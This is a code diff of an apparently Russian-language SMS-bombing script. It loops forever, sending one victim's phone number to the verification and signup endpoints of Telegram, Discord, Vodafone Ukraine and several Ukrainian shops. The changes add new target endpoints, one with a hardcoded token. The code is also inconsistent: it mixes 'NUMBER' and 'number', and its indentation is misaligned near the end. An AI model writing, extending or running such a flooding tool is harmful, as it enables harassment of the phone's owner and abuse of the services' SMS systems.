@@ -46,22 +46,22 @@ while True:
 
  try:
      print('telegram')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
+     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={"phone": "+" + NUMBER})
  except:
      print('Не доставлено "telegram"')
  try:
      print('discord')
-     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
+     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={"phone": "+" + NUMBER})
  except:
      print('Не доставлено "discord"')
  try:
      print('megasport')
-     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
+     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={"phone": "+" + NUMBER})
  except:
      print('Не доставлено "megasport"')
  try:
      print('xtra.tv')
-     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
+     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={"phone": "+" + NUMBER})
  except:
      print('Не доставлено "xtra.tv"')
  try:
@@ -69,9 +69,17 @@ while True:
      response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('Не доставлено "xtra.tv-pass"')
-     time.sleep(5)
  try:
-     print('multiplex')
-     response = requests.post('https://auth.multiplex.ua/login', headers=headers, json={'phone' :  NUMBER})
+     print('Отправлено')
+     response = requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", headers=headers, json={"number": number})
  except:
-      print('Не доставлено "multiplex"')
+     print('Не Отправлено')
+ try:
+     print('Отправлено')
+     response = requests.post("https://zolotakoroleva.ua/api/send-otp",  headers=headers, json={"params": {"phone": "+" + number}})
+ except:
+     print('Не Отправлено')
+ try:
+     response = requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
+except:
+     time.sleep(5)
